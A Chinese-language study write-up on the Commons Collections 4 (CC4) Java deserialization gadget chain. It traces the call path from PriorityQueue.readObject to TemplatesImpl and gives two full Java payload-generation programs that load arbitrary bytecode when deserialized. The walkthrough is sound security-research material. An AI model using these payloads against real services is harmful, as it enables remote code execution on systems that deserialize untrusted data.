# 背景：

CommonsCollections 4 是在 Commons Collections 3.2.1 之后出现的版本，API 有些变化，所以它的利用链也发生了变化。

CC4 是 ysoserial 中的一条 gadget 链，CommonsCollections4，它和 CC1、CC3、CC6 一样，都是基于 InvokerTransformer 的调用链，但它绕过了某些版本中对 CC1 的修复。
它存在于 commons-collections 4.0 版本中（后续版本修复）。

本质是通过 TransformingComparator + PriorityQueue 触发 InvokerTransformer 的恶意方法调用。


<img width="993" height="716" alt="image" src="https://github.com/user-attachments/assets/56875b8b-e1db-4cee-8558-bd60ecf2c49d" />

CC4的后半段和CC3一样，
既然都是CC链，那么就肯定绕不开transformer，
来到ChainedTransfomer搜索transform的用法

最后是在TransformingComparator类中的compare方法存在调用


<img width="2058" height="1457" alt="image" src="https://github.com/user-attachments/assets/d027bdeb-f901-4770-a44a-28a8292581ad" />


<img width="1299" height="882" alt="image" src="https://github.com/user-attachments/assets/38332c2e-2d57-4734-a226-872903f6924a" />

在 PriorityQueue类中的712行siftDownUsingComparator方法中有调用compare


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/f875ece1-98d8-4807-ae3c-b38439143869" />

继续找，谁调用了siftDownUsingComparator
在687行的siftDown方法调用了


<img width="876" height="216" alt="image" src="https://github.com/user-attachments/assets/96a64b13-f646-4764-9cb5-4648b5056a69" />

再找，来到736行，heapify方法调用了siftDown方法

<img width="897" height="216" alt="image" src="https://github.com/user-attachments/assets/abe58e46-54fc-4ac2-9d63-3469bd967437" />

最后来到
795行的readObject方法，调用了heapify


<img width="1068" height="644" alt="image" src="https://github.com/user-attachments/assets/bb430e3b-dcb8-4051-9976-99747aa546fd" />

调用流程：

readObject-->heapify-->siftDown-->siftDownUsingComparator-->TransformingComparator.compare-->transform

结合CC3，那么CC4的整体链子流程应该是：

PriorityQueue.readObject() 

PriorityQueue.heapify() 

PriorityQueue.siftDown() 

PriorityQueue.siftDownUsingComparator() 

TransformingComparator.compare() 

ChainedTransformer.transform() 

InstantiateTransformer.transform() 

TemplatesImpl.newTransformer() 

defineClass()->newInstance()

Payload构造：

直接将CC3的前半段粘过来，
TransformingComparator和PriorityQueue都是Public并且都实现了Serializable接口，所以可以直接实例化，然后传参数进去

<img width="1128" height="48" alt="image" src="https://github.com/user-attachments/assets/56b00c30-fa31-4a70-a61f-21ecdcaaf1ab" />

<img width="816" height="75" alt="image" src="https://github.com/user-attachments/assets/6bbc2cf5-9188-456a-b166-be73ac433648" />

<img width="1818" height="960" alt="image" src="https://github.com/user-attachments/assets/a6a9d8f2-c238-4b62-9021-e0c2486b0920" />

但是现在运行发现，并没有执行计算器代码

断点调试：

在heapify方法中的这个size为0，并没有进入到siftDown方法里面


<img width="2208" height="1413" alt="image" src="https://github.com/user-attachments/assets/a7d93da1-aa0f-48d9-99af-0f24244a0bd6" />

这个size至少是要有2个，才能够进入到siftDown，
至少需要2个的话，那就直接add添加，
但是报错了


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/268dcc7c-80c5-4920-905f-65d2e8656a50" />

因为在add方法里面就已经调用了compare方法了

<img width="608" height="111" alt="image" src="https://github.com/user-attachments/assets/8afe5590-1f4d-41f6-b0c3-f9fc35491fa2" />

<img width="813" height="474" alt="image" src="https://github.com/user-attachments/assets/a8c1b076-9eea-4053-9105-b1e7ecae1490" />


<img width="819" height="207" alt="image" src="https://github.com/user-attachments/assets/a9d655f7-43f1-4d2e-8ea9-62a1ef33c70f" />


<img width="861" height="363" alt="image" src="https://github.com/user-attachments/assets/ac489dd9-baa3-48e3-99f6-7a09bbd0e8a8" />

就像在URLDNS链一样，在add的时候就已经调用了compare方法，然后调用了transform，
然后就在本机执行了，我们的最终目的是要它在反序列化也就是readObject的时候执行

这里就有两个方法可以解决

1、在TransformingComparator传递chainedTransformer的时候改成其他没用的参数，等add添加完size之后再将chainedTransformer反射改回来

2、反射修改size，修改为2

方法1：

<img width="1992" height="1467" alt="image" src="https://github.com/user-attachments/assets/ebd66cb8-96d0-4948-a1ec-ead2a618b661" />

        TemplatesImpl templates = new TemplatesImpl();
        Class TemplateClass = templates.getClass();
        Field name = TemplateClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "123");

        Field bytecodes = TemplateClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\code-audit\\CC3\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer,
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, chainedTransformer);
        
        serialize(priorityQueue);
        unserialize("ser.bin");

    }

    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }


方法2：


<img width="2163" height="1473" alt="image" src="https://github.com/user-attachments/assets/c7f659aa-cfe7-4012-b533-0a4a71eca6ad" />

        TemplatesImpl templates = new TemplatesImpl();
        Class TemplateClass = templates.getClass();
        Field name = TemplateClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "123");

        Field bytecodes = TemplateClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\code-audit\\CC3\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer,
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);

        Class priorityQueueClass = priorityQueue.getClass();
        Field size = priorityQueueClass.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue, 2);

        serialize(priorityQueue);
        unserialize("ser.bin");

    }


    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }

CC2和CC4几乎是一模一样的，只不过CC4利用的是chainedTransformer，而CC2利用的是InvokerTransformer，
最后再add添加size的时候，把templates传进去

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/deca82f3-530c-4910-869d-5c1a30ac76d7" />

这样就少了自定义添加transformers数组这一步，也没有用到ChainedTransformer
